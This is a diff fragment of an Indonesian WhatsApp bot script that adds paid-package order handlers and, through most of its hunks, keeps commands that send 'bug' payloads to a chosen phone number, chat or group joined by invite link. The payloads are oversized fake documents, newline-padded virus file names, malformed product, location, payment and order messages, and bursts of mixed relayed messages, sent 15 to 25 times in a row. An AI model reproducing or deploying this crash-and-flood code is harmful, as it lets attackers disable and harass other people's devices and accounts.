+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*�? ORDER �?*
+📮 : *Paket:* 35K �? Premium 1 Tahun
+- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
+} else
+if ((args[0]) == 'permanent'){
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*�? ORDER �?*
+📮 : *Paket:* 45K �? Premium Permanent
+- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
+}
+break
+case 'botkay':
+if ((args[0]) == '1minggu'){
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*�? ORDER �?*
+📮 : *Paket:* 10K �? Jadibot 1 Minggu
+- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
+} else
+if ((args[0]) == '1bulan'){
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*�? ORDER �?*
+📮 : *Paket:* 20K �? Jadibot 1 Bulan
+- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
+} else
+if ((args[0]) == '1tahun'){
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*�? ORDER �?*
+📮 : *Paket:* 35K �? Jadibot 1 Tahun
+- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
+} else
+if ((args[0]) == 'permanent'){
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*�? ORDER �?*
+📮 : *Paket:* 45K �? Jadibot Permanent
+- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
+}
+break
+case 'ownkay':
+if ((args[0]) == '1minggu'){
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*�? ORDER �?*
+📮 : *Paket:* 10K �? Jadi Owner 1 Minggu
+- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
+} else
+if ((args[0]) == '1bulan'){
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*�? ORDER �?*
+📮 : *Paket:* 20K �? Jadi Owner 1 Bulan
+- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
+} else
+if ((args[0]) == '1tahun'){
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*�? ORDER �?*
+📮 : *Paket:* 35K �? Jadi Owner 1 Tahun
+- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
+} else
+if ((args[0]) == 'permanent'){
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*�? ORDER �?*
+📮 : *Paket:* 45K �? Jadi Owner Permanent
+- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
+}
 break
 case 'addprem':
 if (!itsMebaymax) return reply(mess.owner)
@@ -2788,7 +2271,7 @@ if (/document/.test(mime)) return reply(`Send/Reply Video/Audio You Want to Conv
 if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
 mee = await baymax.downloadAndSaveMediaMessage(quoted)
 mem = await uptotelegra(mee)
-baymax.sendMessage(m.chat, { document: {url:mem}, mimetype: 'audio/mpeg', fileName: `Convert By ${pushname}.mp3`, jpegThumbnail: ppnyauser, mentions:[sender] }, {quoted:m})
+baymax.sendMessage(m.chat, { document: {url:mem}, mimetype: 'audio/mpeg', fileName: `Convert By ${pushname}.mp3`, jpegThumbnail: ppnyaimg, mentions:[sender] }, {quoted:m})
 break
 case 'smeme':
 if (!q) return reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
@@ -2839,7 +2322,7 @@ case 'cekme':
 *Ketakutan :* ${takut}%
 
 *≡═════�? CEKSIFATME 》═════�?*`
-					buff = await getBuffer(ppuser)
+					buff = await getBuffer(ppimg)
 baymax.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
 break
 case 'toimg': {
@@ -2850,7 +2333,7 @@ exec(`ffmpeg -i ${media} ${ran}`, (err) => {
 fs.unlinkSync(media)
 if (err) throw err
 let buffer = fs.readFileSync(ran)
-baymax.sendMessage(m.chat, { image: buffer, jpegThumbnail: ppnyauser, 
+baymax.sendMessage(m.chat, { image: buffer, jpegThumbnail: ppnyaimg, 
 contextInfo: {
 "mentionedJid": [sender],
 "externalAdReply": {
@@ -2859,7 +2342,7 @@ contextInfo: {
 "title": `Hai Kak ${pushname}`, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": ppnyauser,
+"thumbnail": ppnyaimg,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }}
@@ -3062,7 +2545,7 @@ if (!itsMebaymax) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
 jumlah = '15'
 for (let i = 0; i < jumlah; i++) {
-baymax.sendMessage(`${q}`.split("-").join("").split(" ").join("").replace("+", "")+"@s.whatsapp.net", {sticker: ppnyauser},{quoted: {
+baymax.sendMessage(`${q}`.split("-").join("").split(" ").join("").replace("+", "")+"@s.whatsapp.net", {sticker: ppnyaimg},{quoted: {
 key: { 
 fromMe: false, 
 participant: `0@s.whatsapp.net`, 
@@ -3109,8 +2592,8 @@ mimetype: 'audio/mpeg',
 caption: `baymax Bot WhatsApp${ngazap(prefix)}`,
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: ppnyauser, 
-thumbnail: ppnyauser,
+thumbnailUrl: ppnyaimg, 
+thumbnail: ppnyaimg,
 }
 }}}}}, { quoted:crsh })
 await sleep(1000)
@@ -3135,8 +2618,8 @@ mimetype: 'audio/mpeg',
 caption: `baymax Bot WhatsApp${ngazap(prefix)}`,
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: ppnyauser, 
-thumbnail: ppnyauser,
+thumbnailUrl: ppnyaimg, 
+thumbnail: ppnyaimg,
 }
 }}}}}, { quoted:crsh })
 await sleep(1000)
@@ -3148,7 +2631,7 @@ if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+comman
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: baymax.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: baymax.waUploadToServer })
 var liveLocation = generateWAMessageFromContent(num, proto.Message.fromObject({
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
@@ -3182,7 +2665,7 @@ currencyCodeIso4217: 'IDR',
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
 amount: 1, 
-background: ppnyauser }}}}, {quoted:lep})
+background: ppnyaimg }}}}, {quoted:lep})
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
@@ -3219,10 +2702,10 @@ num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 baymax.sendMessage(num, { 
-document: ppnyauser, 
+document: ppnyaimg, 
 fileName: `🔥 baymax BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
 mimetype: `application/txt`, 
-jpegThumbnail: ppnyauser, 
+jpegThumbnail: ppnyaimg, 
 fileLength: "999999999", 
 mentions:[sender] }, {quoted:lep})
 await sleep(1000)
@@ -3236,7 +2719,7 @@ if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+comman
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-baymax.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
+baymax.sendMessage(num, {sticker: ppnyaimg},{ quoted: lep })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
@@ -3248,7 +2731,7 @@ if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+comman
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-sendBugcrash(num, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
+sendBugcrash(num, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, ppnyaimg, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
@@ -3260,7 +2743,7 @@ if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+comman
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: baymax.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: baymax.waUploadToServer })
 var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "productMessage": {
 "product": {
@@ -3289,7 +2772,7 @@ case 'kaylog':{
 if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: baymax.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: baymax.waUploadToServer })
 var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productMessage": {
 "product": {
@@ -3318,7 +2801,7 @@ case 'kayloc':{
 if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: baymax.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: baymax.waUploadToServer })
 var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
@@ -3351,7 +2834,7 @@ case 'kayitem':{
 if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-sendBugcrash(m.chat, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
+sendBugcrash(m.chat, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, ppnyaimg, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
@@ -3361,7 +2844,7 @@ case 'kaystick':{
 if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-baymax.sendMessage(m.chat, {sticker: ppnyauser},{ quoted: lep })
+baymax.sendMessage(m.chat, {sticker: ppnyaimg},{ quoted: lep })
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
@@ -3371,10 +2854,10 @@ if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 baymax.sendMessage(m.chat, { 
-document: ppnyauser, 
+document: ppnyaimg, 
 fileName: `🔥 baymax BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
 mimetype: `application/txt`, 
-jpegThumbnail: ppnyauser, 
+jpegThumbnail: ppnyaimg, 
 fileLength: "999999999", 
 mentions:[sender] }, {quoted:gifes})
 await sleep(1000)
@@ -3405,7 +2888,7 @@ currencyCodeIso4217: 'IDR',
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
 amount: 1, 
-background: ppnyauser }}}}, {quoted:lep})
+background: ppnyaimg }}}}, {quoted:lep})
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
@@ -3473,10 +2956,10 @@ jumlah = q.split('|')[1]
 let cekno = await baymax.onWhatsApp(numt)
 if (cekno.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 if (isNaN(jumlah)) return reply(`Harus berupa angka`)
-var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6281390368580@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyauser, caption: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
+var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6281390368580@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyaimg, caption: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
 var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK 🥶',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: lep })
-var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: baymax.waUploadToServer })
-var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ppnyauser,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: lep })
+var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: baymax.waUploadToServer })
+var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ppnyaimg,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: lep })
 var audio = generateWAMessageFromContent(from,proto.Message.fromObject({audioMessage: {url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',mimetype: 'audio/mpeg',fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',fileLength: '258330',seconds: 16,ptt: false,mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',mediaKeyTimestamp: '1657190832',},}),{ userJid: from, quoted: lep })
 var image = generateWAMessageFromContent(from,proto.Message.fromObject({imageMessage: {url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',mimetype: 'image/jpeg',caption: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',fileLength: '42521',height: 426,width: 640,mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',mediaKeyTimestamp: '1657286523',jpegThumbnail: messa.imageMessage,},}),{ userJid: from, quoted: lep })
 var document = generateWAMessageFromContent(from,proto.Message.fromObject({documentMessage: {url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',mimetype: 'application/octet-stream',title: '.dev',fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',pageCount: 0,mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',fileName: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',mediaKeyTimestamp: '1657288637',},}),{ userJid: from, quoted: lep })
@@ -3492,7 +2975,7 @@ baymax.relayMessage(numt, image.message, { messageId: image.key.id })
 baymax.relayMessage(numt, document.message, { messageId: document.key.id })
 baymax.relayMessage(numt, liveLocation.message, { messageId: liveLocation.key.id })
 baymax.relayMessage(numt, sticker.message, { messageId: sticker.key.id })
-baymax.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ppnyauser, { quoted: lep })
+baymax.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ppnyaimg, { quoted: lep })
 baymax.sendMessage(numt, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
 }
 }
@@ -3514,7 +2997,7 @@ currencyCodeIso4217: 'IDR',
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
 amount: 1, 
-background: ppnyauser }}}}, {quoted:lep})
+background: ppnyaimg }}}}, {quoted:lep})
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
@@ -3529,10 +3012,10 @@ jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 let kir = await baymax.groupAcceptInvite(result)
 baymax.sendMessage(kir, { 
-document: ppnyauser, 
+document: ppnyaimg, 
 fileName: `🔥 baymax BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
 mimetype: `application/txt`, 
-jpegThumbnail: ppnyauser, 
+jpegThumbnail: ppnyaimg, 
 mentions:[sender] }, {quoted:lep})
 await sleep(1000)
 }
@@ -3547,7 +3030,7 @@ let result = args[0].split('https://chat.whatsapp.com/')[1]
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 let kir = await baymax.groupAcceptInvite(result)
-var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: baymax.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: baymax.waUploadToServer })
 var location = generateWAMessageFromContent(kir, proto.Message.fromObject({
 "locationMessage": {
 "degreesLatitude": -6.936928157735237,
@@ -3945,7 +3428,7 @@ let buttoons = [
 ]
 let buttonMessaage = {
 image: { url: yeha }, 
-jpegThumbnail: ppnyauser,
+jpegThumbnail: ppnyaimg,
 caption: `Nih Kak @${sender.split("@")[0]}`,
 fileLength: "999999999999",
 mentions: [sender],
